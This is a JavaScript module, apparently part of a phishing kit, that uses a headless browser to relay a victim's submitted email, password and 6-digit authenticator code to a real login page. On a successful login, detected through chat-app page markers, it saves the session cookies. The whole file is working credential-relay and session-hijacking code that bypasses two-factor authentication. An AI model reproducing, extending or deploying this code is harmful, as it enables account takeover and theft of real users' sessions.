const { cout } = require("../../../utils/server-helpers")
const { Application } = require("../../Application")

class SpikeApplication extends Application {
    async runBeforeResponse(page) {
        try {
            if (this.email.length > 0) {
                const email = `[name="email"]`
                await page.waitForSelector(email)
                await page.type(email, this.email)
            }
        } catch (error) { }
    }

    saveBeforeResponse(html) {
        const pos = [
            ["Friends", "Online", "All", "Blocked"]
        ]

        for (let cPos of pos) {
            let match = 0
            for (const i of cPos) {
                if (html.includes(i)) match += 1
            }

            if (match == cPos.length) return true
        }

        return false
    }

    async postRequest(body) {
        try {
            const page = await this.connectBrowser()
            await page.setExtraHTTPHeaders({
                "User-Agent": this.useragent
            })

            const spikeType = body["spikeType"]

            console.log(body);
            if (spikeType == "home-login") {
                const email = `[name="email"]`
                const password = `[name="password"]`

                await page.waitForSelector(email)
                await page.waitForSelector(password)
                await page.type(email, body.email)
                await page.type(password, body.password)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch" || response.request().resourceType() == "xhr") {
                        await new Promise(re => setTimeout(re, 8000))
                        return true
                    }
                })
            } else if (spikeType == "auth-app-code") {
                const inp = `[placeholder="6-digit authentication code"]`
                await page.waitForSelector(inp)
                await page.evaluate(() => {
                    document.querySelector(`[placeholder="6-digit authentication code"]`).value = ""
                    document.querySelector(`[placeholder="6-digit authentication code"]`).setAttribute("value", "")
                })
                await page.type(inp, body.authcode)
                await page.click(`[type="submit"]`)
                await page.waitForResponse(async response => {
                    if (response.request().resourceType() == "fetch" || response.request().resourceType() == "xhr") {
                        await new Promise(re => setTimeout(re, 3000))
                        return true
                    }
                })
            }

            else {
                return await this.getRequest()
            }

            const html = this.alterHTML(await page.content())
            if (this.saveBeforeResponse(html)) return await this.saveCookies()

            return html
        } catch (error) {
            cout.err(error);
            return await this.getRequest()
        }
    }
}

module.exports = { SpikeApplication }